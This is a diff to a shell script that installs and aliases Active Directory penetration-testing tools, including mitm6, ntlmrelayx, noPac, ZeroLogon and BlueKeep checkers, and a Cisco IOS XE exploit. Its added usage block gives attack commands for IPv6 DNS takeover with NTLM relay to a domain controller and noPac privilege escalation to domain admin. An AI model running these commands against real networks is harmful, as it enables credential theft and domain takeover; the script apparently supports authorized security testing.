@@ -72,6 +72,33 @@ if ! "$TOOLS_DIR/ItWasAllADream/.venv/bin/pip" install "$TOOLS_DIR/ItWasAllADrea
     echo "    cd $TOOLS_DIR/ItWasAllADream && .venv/bin/python -m itwasalladream ..."
 fi
 
+echo "=== mitm6 ==="
+pipx install --force mitm6
+
+echo "=== impacket (for ntlmrelayx) ==="
+pipx install --force impacket
+
+echo "=== BlueKeep ==="
+if [ ! -d "$TOOLS_DIR/detect_bluekeep" ]; then
+    git clone https://github.com/blacklanternsecurity/detect_bluekeep.py.git "$TOOLS_DIR/detect_bluekeep"
+fi
+python3 -m venv "$TOOLS_DIR/detect_bluekeep/.venv"
+"$TOOLS_DIR/detect_bluekeep/.venv/bin/pip" install impacket 2>/dev/null || true
+
+echo "=== ZeroLogon ==="
+if [ ! -d "$TOOLS_DIR/CVE-2020-1472" ]; then
+    git clone https://github.com/bvcyber/CVE-2020-1472.git "$TOOLS_DIR/CVE-2020-1472"
+fi
+python3 -m venv "$TOOLS_DIR/CVE-2020-1472/.venv"
+"$TOOLS_DIR/CVE-2020-1472/.venv/bin/pip" install impacket 2>/dev/null || true
+
+echo "=== noPac ==="
+if [ ! -d "$TOOLS_DIR/noPac" ]; then
+    git clone https://github.com/Ridter/noPac.git "$TOOLS_DIR/noPac"
+fi
+python3 -m venv "$TOOLS_DIR/noPac/.venv"
+"$TOOLS_DIR/noPac/.venv/bin/pip" install -r "$TOOLS_DIR/noPac/requirements.txt" || true
+
 echo "=== Responder ==="
 if [ ! -d "$TOOLS_DIR/Responder" ]; then
     git clone https://github.com/lgandx/Responder.git "$TOOLS_DIR/Responder"
@@ -90,6 +117,11 @@ echo -n "msfconsole:     "; command -v msfconsole &>/dev/null && echo "OK" || ec
 echo -n "nuclei:         "; command -v nuclei &>/dev/null && nuclei --version 2>&1 | head -1 || echo "MISSING"
 echo -n "git-dumper:     "; command -v git-dumper &>/dev/null && echo "OK" || echo "MISSING"
 echo -n "pre2k:          "; command -v pre2k &>/dev/null && echo "OK" || echo "MISSING"
+echo -n "mitm6:          "; command -v mitm6 &>/dev/null && echo "OK" || echo "MISSING"
+echo -n "ntlmrelayx:     "; command -v ntlmrelayx.py &>/dev/null && echo "OK" || echo "MISSING"
+echo -n "BlueKeep:       "; [ -f "$TOOLS_DIR/detect_bluekeep/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
+echo -n "ZeroLogon:      "; [ -f "$TOOLS_DIR/CVE-2020-1472/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
+echo -n "noPac:          "; [ -f "$TOOLS_DIR/noPac/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
 echo -n "Responder:      "; [ -f "$TOOLS_DIR/Responder/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
 echo -n "ItWasAllADream: "; [ -f "$TOOLS_DIR/ItWasAllADream/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
 echo -n "CVE-2023-20198: "; [ -f "$TOOLS_DIR/CVE-2023-20198/.venv/bin/python" ] && echo "OK (venv)" || echo "MISSING"
@@ -105,5 +137,41 @@ cat <<'ALIASES'
 # Pentest Tools
 alias Responder='sudo ~/pentest-tools/Responder/.venv/bin/python ~/pentest-tools/Responder/Responder.py'
 alias itwasalladream='~/pentest-tools/ItWasAllADream/.venv/bin/itwasalladream'
+alias noPac='~/pentest-tools/noPac/.venv/bin/python ~/pentest-tools/noPac/noPac.py'
+alias bluekeep='~/pentest-tools/detect_bluekeep/.venv/bin/python ~/pentest-tools/detect_bluekeep/detect_bluekeep.py'
+alias zerologon='~/pentest-tools/CVE-2020-1472/.venv/bin/python ~/pentest-tools/CVE-2020-1472/zerologon_tester.py'
 alias cve-2023-20198='~/pentest-tools/CVE-2023-20198/.venv/bin/python ~/pentest-tools/CVE-2023-20198/exploit.py'
 ALIASES
+
+echo ""
+echo "========================================="
+echo "Usage examples:"
+echo "========================================="
+cat <<'USAGE'
+
+# ItWasAllADream (PrintNightmare check)
+itwasalladream -u <user> -p <pass> -d <domain> <targets>
+# or via Docker:
+# docker run -v "$(pwd)":/app itwasalladream -u <user> -p <pass> -d <domain> /app/445s.txt
+
+# mitm6 + ntlmrelayx (IPv6 DNS takeover → NTLM relay)
+sudo mitm6 -d <domain>
+# In a second terminal:
+ntlmrelayx.py -6 -t ldaps://<dc-ip> -wh <attacker-ip> -l loot
+
+# BlueKeep (CVE-2019-0708 — detection only)
+bluekeep <IP or range>
+
+# ZeroLogon (CVE-2020-1472 — test only, no exploit)
+zerologon <DC-NAME> <DC-IP>
+
+# noPac (CVE-2021-42278/42287 — domain user → domain admin)
+noPac <domain.com>/<user>:'<password>' -dc-ip <dc-ip>
+
+# Responder (passive LLMNR/NBT-NS check)
+Responder -I <interface>
+
+# CVE-2023-20198 (Cisco IOS XE)
+cve-2023-20198 -t <target> -c
+
+USAGE
